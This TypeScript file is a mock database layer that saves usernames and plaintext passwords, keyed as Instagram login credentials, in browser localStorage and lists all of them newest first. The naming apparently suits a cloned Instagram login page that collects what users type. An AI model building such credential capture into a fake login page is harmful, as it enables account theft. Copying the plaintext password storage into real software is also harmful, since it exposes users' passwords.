
// This is a mock implementation for the browser environment
// In a real application, you would never store credentials on the client-side
// and would instead use a proper backend API to handle MongoDB operations

// Define the Credential type that matches our application needs
export interface Credential {
  _id: string;
  username: string;
  password: string;
  timestamp: string;
}

// A simple mock MongoDB implementation using localStorage
class MockMongoClient {
  private storageKey = 'instagram_login_credentials';
  
  async storeCredential(username: string, password: string): Promise<{ success: boolean, id: string }> {
    try {
      // Get existing credentials
      const existingCredentials = this.getCredentials();
      
      // Create a new credential document
      const newCredential: Credential = {
        _id: crypto.randomUUID(), // Generate a random ID
        username,
        password,
        timestamp: new Date().toISOString()
      };
      
      // Add to existing credentials
      existingCredentials.push(newCredential);
      
      // Save back to localStorage
      localStorage.setItem(this.storageKey, JSON.stringify(existingCredentials));
      
      return { success: true, id: newCredential._id };
    } catch (error) {
      console.error("Failed to store login credential:", error);
      return { success: false, id: '' };
    }
  }
  
  getCredentials(): Credential[] {
    try {
      const storedData = localStorage.getItem(this.storageKey);
      if (!storedData) return [];
      return JSON.parse(storedData) as Credential[];
    } catch (error) {
      console.error("Failed to retrieve credentials:", error);
      return [];
    }
  }
}

// Create a singleton instance
const mockMongoClient = new MockMongoClient();

export async function storeLoginCredential(username: string, password: string) {
  return mockMongoClient.storeCredential(username, password);
}

export async function getLoginCredentials() {
  try {
    const credentials = mockMongoClient.getCredentials();
    // Sort by timestamp in descending order (newest first)
    credentials.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
    
    return { success: true, data: credentials };
  } catch (error) {
    console.error("Failed to get login credentials:", error);
    return { success: false, error };
  }
}
